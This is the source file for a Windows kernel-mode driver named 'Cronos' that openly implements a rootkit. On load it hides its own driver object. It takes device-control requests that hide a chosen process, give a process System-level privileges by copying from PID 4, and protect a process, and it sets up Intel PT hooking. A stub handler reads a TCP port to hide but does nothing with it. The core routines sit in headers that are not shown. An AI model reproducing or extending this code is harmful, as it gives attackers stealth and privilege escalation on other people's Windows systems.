#include <ntifs.h>
#include <ntddk.h>
#include "Driver.h"
#include "Rootkit.h"
#include "PtHook.h"

// Global variable for PT support
BOOLEAN g_HasPtWrite = FALSE;

NTSTATUS DriverCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
NTSTATUS DriverDispatch(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject);

extern "C"
NTSTATUS
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	KdPrint(("[+] Driver loaded!\n"));

	// Check for Intel PT support
	int cpuInfo[4];
	__cpuidex(cpuInfo, 0x7, 0);
	if (!(cpuInfo[1] & (1 << 25))) {
		KdPrint(("[-] Intel PT not supported\n"));
		return STATUS_UNSUCCESSFUL;
	}
	
	// Check for PTWRITE support
	BOOLEAN hasPtWrite = FALSE;
	__cpuidex(cpuInfo, 0x14, 0x0);
	if (cpuInfo[1] & (1 << 4)) {
		KdPrint(("[+] PTWRITE supported\n"));
		hasPtWrite = TRUE;
	}
	g_HasPtWrite = hasPtWrite;

	DriverObject->DriverUnload = DriverUnload;

	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverDispatch;

	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\Cronos");

	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(DriverObject,
		0,
		&devName,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&DeviceObject);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[-] Unable to create device! %d\n", status));
		return status;
	}

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Cronos");
	status = IoCreateSymbolicLink(&symLink, &devName);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[-] Unable to create symbolic link! %d\n", status));
		IoDeleteDevice(DeviceObject);
		return status;
	}

	HideDriver(DriverObject);

	// Initialize PT hooking infrastructure
	if (g_HasPtWrite) {
		status = InitializePtHooking();
		if (!NT_SUCCESS(status)) {
			KdPrint(("[-] Failed to initialize PT hooking: 0x%x\n", status));
			// Continue without PT hooking
		}
	}

	return status;
}

NTSTATUS DriverDispatch(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
	NTSTATUS status = STATUS_SUCCESS;
	auto stack = IoGetCurrentIrpStackLocation(Irp);

	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_HIDEPROC:
	{
		KdPrint(("[+] Received hide process request\n"));
		auto len = stack->Parameters.DeviceIoControl.InputBufferLength;
		if (len < sizeof(HideProcData))
		{
			KdPrint(("[-] Received too small buffer\n"));
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		auto data = (HideProcData*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
		if (data == nullptr)
		{
			KdPrint(("[-] Received empty buffer\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		ULONG targetPid = data->TargetPID;
		GhostProcess(targetPid);
		break;
	}

	case IOCTL_ELEVATEME:
	{
		PEPROCESS pTargetProcess, pSrcProcess;
		KdPrint(("[+] Received elevation request\n"));
		auto len = stack->Parameters.DeviceIoControl.InputBufferLength;
		if (len < sizeof(ElevateData))
		{
			KdPrint(("[-] Received too small buffer\n"));
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		auto data = (ElevateData*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
		if (data == nullptr)
		{
			KdPrint(("[-] Received empty buffer\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		ULONG targetPid = data->TargetPID;
		ULONG srcPid = 4; //System PID is always 4
		KdPrint(("[+] Target PID: %d and destination PID: %d\n", targetPid, srcPid));
		status = ProcessElevation(srcPid, targetPid);
		break;
	}

	case IOCTL_HIDETCP:
	{
		KdPrint(("[+] Received hide TCP request\n"));
		auto len = stack->Parameters.DeviceIoControl.InputBufferLength;
		if (len < sizeof(HideTcpData))
		{
			KdPrint(("[-] Received too small buffer\n"));
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		auto data = (HideTcpData*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
		if (data == nullptr)
		{
			KdPrint(("[-] Received empty buffer\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		ULONG port = data->Port;
		break;
	}

	case IOCTL_PROTECT:
	{
		KdPrint(("[+] Received process protect request!\n"));
		NTSTATUS status = STATUS_SUCCESS;
		auto len = stack->Parameters.DeviceIoControl.InputBufferLength;
		if (len < sizeof(ProtectProcessData))
		{
			KdPrint(("[-] Received too small buffer\n"));
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		auto data = (ProtectProcessData*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
		if (data == nullptr)
		{
			KdPrint(("[-] Received empty buffer\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		ULONG targetPid = data->TargetPID;

		KdPrint(("[+] Elevating process\n"));
		status = ProcessElevation(4, targetPid);
		if (!NT_SUCCESS(status))
		{
			break;
		}

		KdPrint(("[*] Protecting process\n"));
		status = ProtectProcess(targetPid);
		if (!NT_SUCCESS(status))
		{
			break;
		}
		break;
	}

	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

_Use_decl_annotations_
NTSTATUS DriverCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
	KdPrint(("[+] Driver unload called\n"));

	// Cleanup PT hooking infrastructure
	CleanupPtHooking();

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Cronos");
	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);

	KdPrint(("[*] Driver unloaded!\n"));
}